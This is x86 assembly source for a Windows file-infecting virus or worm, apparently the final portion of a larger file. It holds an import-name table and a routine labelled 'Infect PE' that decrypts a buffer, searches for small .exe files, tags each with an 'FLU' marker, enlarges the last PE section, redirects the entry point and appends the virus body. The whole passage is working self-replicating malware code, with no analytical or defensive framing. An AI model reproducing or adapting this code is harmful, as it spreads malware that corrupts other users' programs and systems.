        db 44, 65, 6Ch, 65, 74, 65, 46, 69, 6Ch, 65, 41, 00, 00, 00, 45, 78
        db 69, 74, 50, 72, 6Fh, 63, 65, 73, 73, 00, 00, 00, 46, 69, 6Eh, 64
        db 46, 69, 72, 73, 74, 46, 69, 6Ch, 65, 41, 00, 00, 00, 00, 47, 65
        db 74, 43, 6Fh, 6Dh, 6Dh, 61, 6Eh, 64, 4Ch, 69, 6Eh, 65, 41, 00, 00, 00
        db 52, 65, 61, 64, 46, 69, 6Ch, 65, 00, 00, 00, 00, 53, 65, 74, 46
        db 69, 6Ch, 65, 50, 6Fh, 69, 6Eh, 74, 65, 72, 00, 00, 00, 00, 57, 69
        db 6Eh, 45, 78, 65, 63, 00, 00, 00, 52, 65, 67, 51, 75, 65, 72, 79
        db 56, 61, 6Ch, 75, 65, 45, 78, 41, 00, 00, 00, 00, 52, 65, 67, 4Fh
        db 70, 65, 6Eh, 4Bh, 65, 79, 45, 78, 41, 00, 00, 00, 52, 65, 67, 43
        db 6Ch, 6Fh, 73, 65, 4Bh, 65, 79, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00

        db 00, 10, 00, 00, 0A4h, 00, 00, 00, 0Fh, 30, 15, 30, 1Fh, 30, 3Bh, 30
        db 45, 30, 5Ch, 30, 66, 30, 72, 30, 78, 30, 7Eh, 30, 89, 30, 93, 30
        db 9Dh, 30, 0A2h, 30, 0BEh, 30, 0C8h, 30, 0D7h, 30, 1Ch, 31, 22, 31, 28, 31
        db 37, 31, 48, 31, 60, 31, 06Eh, 31, 7Bh, 31, 8Ch, 31, 94, 31, 9Fh, 31
        db 0A4h, 31, 0AEh, 31, 0C6h, 31, 0D1h, 31, 0DBh, 31, 0E6h, 31, 0EDh, 31, 0F5h, 31
        db 0FDh, 31, 04, 32, 1Ch, 32, 26, 32, 38, 32, 3Dh, 32, 48, 32, 52, 32
        db 5Ch, 32, 67, 32, 70, 32, 7Dh, 32, 88, 32, 8Dh, 32, 0A4h, 32, 0BDh, 32
        db 0C3h, 32, 0C9h, 32, 0D2h, 32, 0DEh, 32, 0F0h, 32, 02, 33, 0Ah, 33, 1Ah, 33
        db 26, 33, 30, 33, 42, 33, 48, 33, 4Eh, 33, 54, 33, 5Ah, 33, 60, 33
        db 66, 33, 6Ch, 33, 72, 33, 78, 33, 7Eh, 33, 84, 33, 8Ah, 33, 90, 33
        db 96, 33, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 150 dup (00)

Head333End:

radix 10

_EndHexaEngine:

_EndRPIWE:


                fileA           dd 0
                oldsize         dd 0
                newsize         dd 0
                newfilesize     dd 0
                incsize         dd 0
                newip           dd 0
                Infect?k        dd 0
                EXE_FILEZ       db '*.exe',0
                ExeHeader       db 1000 dup (?)

VirusStatINF:

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Infect PE  flu_infect.inc                                                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

_InfectFile:
                mov     ecx,7000h
                mov     esi,offset ReadBinaryBuff
_decri:
                xor     dword ptr [esi],041h
                inc     esi
                loop    _decri


                mov     edx,offset EXE_FILEZ
                push    offset FindFileData
                push    edx

                call    FindFirstFileA

                inc     eax
                je      quit_PE
                dec     eax

                push    eax

loop_infectpe:
                mov     ecx,[FindFileData.nFileSizeLow]
                mov     ebx,100000
                sub     ebx,ecx
                jc      loop_search

                lea     edi,[FindFileData.cFileName]

                call    InfectPE

loop_search:
                pop     eax
                push    eax
                lea     ebx,FindFileData
                push    ebx
                push    eax
                call    FindNextFileA

                inc     eax
                je      quit_PE
                dec     eax

                pop     eax

                jmp     short loop_infectpe

quit_PE:
                ret

InfectPE:
                pushad

                push    0
                push    000000080h
                push    3
                push    0
                push    000000001h
                push    080000000h + 040000000h
                push    edi
                call    CreateFileA

                inc     eax
                je      _NoExeFilez
                dec     eax

                mov     dword ptr [_filehandle],eax

                xor     edx,edx

                push    0
                push    0
                push    edx
                push    eax
                call    SetFilePointer

                mov     edx,1000

                push    00h
                push    offset number
                push    edx
                push    offset ExeHeader
                push    dword ptr [_filehandle]
                call    ReadFile

                mov     esi,offset ExeHeader

                cmp     word ptr [esi],'ZM'
                jne     _CloseFile
                cmp     dword ptr [esi+32h],'ULF'
                je      _CloseFile
                mov     dword ptr [esi+32h],'ULF'
                add     esi, dword ptr [esi + 3ch]
                cmp     dword ptr [esi],'EP'
                jne     _CloseFile
                mov     eax,[esi+28h]
                mov     oldeip,eax
                mov     eax,[esi+3ch]
                mov     fileA,eax

                mov     ebx,[esi+74h]
                shl     ebx,3
                mov     ax,word ptr [esi+6h]
                dec     eax
                mov     ecx,28h
                mul     ecx
                add     esi,78h
                add     esi,ebx
                add     esi,eax

                or      dword ptr ds:[esi+24h],0A0000020h

                mov     eax,[esi+10h]
                mov     oldsize,eax
                add     dword ptr [esi+8h],virus_size

                mov     eax,[esi+8h]
                mov     ecx,fileA
                div     ecx
                mov     ecx,fileA
                sub     ecx,edx
                mov     [esi+10h],ecx
                mov     eax,[esi+8h]
                add     eax,[esi+10h]
                mov     [esi+10h],eax
                mov     newsize, eax


                mov     eax,[esi+0ch]
                add     eax,[esi+8h]
                sub     eax,virus_size
                add     eax,1000
                mov     newip,eax

                mov     eax,offset oldsize
                mov     ebx,offset newsize
                sub     ebx,eax
                mov     incsize, ebx

                mov     eax,[esi+14h]
                add     eax,offset newsize
                mov     newfilesize, eax


                mov     esi, offset ExeHeader
                add     esi, dword ptr [esi + 3ch]
                mov     eax,newip
                mov     [esi+28h],eax
                mov     eax, offset incsize
                add     [esi+50h], eax

                sub     edx,edx

                push    0
                push    0
                push    edx
                push    dword ptr [_filehandle]
                call    SetFilePointer

                mov     ebx,1000
                mov     edx,offset ExeHeader
                call    _WriteFile

                inc     eax
                je      _CloseFile
                dec     eax

                sub     edx,edx

                push    2
                push    edx
                push    edx
                push    dword ptr [_filehandle]
                call    SetFilePointer

                mov     ebx,virus_size
                mov     edx,offset virus_start
                call    _WriteFile

_CloseFile:
                push    dword ptr [_filehandle]
                call    CloseHandle

_NoExeFilez:
                popad

                ret

end _Start_Iworm
